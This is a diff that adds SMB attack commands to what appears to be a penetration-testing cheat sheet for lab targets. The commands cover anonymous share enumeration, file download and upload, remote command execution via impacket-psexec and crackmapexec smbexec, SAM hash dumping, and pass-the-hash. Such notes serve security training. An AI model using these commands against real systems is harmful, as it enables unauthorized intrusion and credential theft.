@@ -514,6 +514,32 @@ office2john.py Protected.docx > protected-docx.hash
 # Network share enumeration using smbmap.
 smbmap -H 10.129.14.128
 
+smbclient -N -L //10.129.14.128
+
+smbmap -H 10.129.14.128 -r notes
+
+smbmap -H 10.129.14.128 --download"notes\note.txt"
+
+smbmap -H 10.129.14.128 --upload test.txt"notes\test.txt"
+
+smbclient //server_name/share_name -U username%password
+
+#With Domain
+smbclient //server_name/share_name -U domain\\username%password
+
+
+#RCE connect with impacket. 
+impacket-psexec administrator:'Password123!'@10.10.110.17
+
+crackmapexec smb 10.10.110.0/24 -u administrator -p'Password123!' --loggedon-users
+
+crackmapexec smb 10.10.110.17 -u Administrator -p'Password123!' -x'whoami' --exec-method smbexec
+
+crackmapexec smb 10.10.110.17 -u administrator -p'Password123!' --sam
+
+#PtH
+crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294
+
 # Null-session with the rpcclient.
 rpcclient -U'%' 10.10.110.17
 
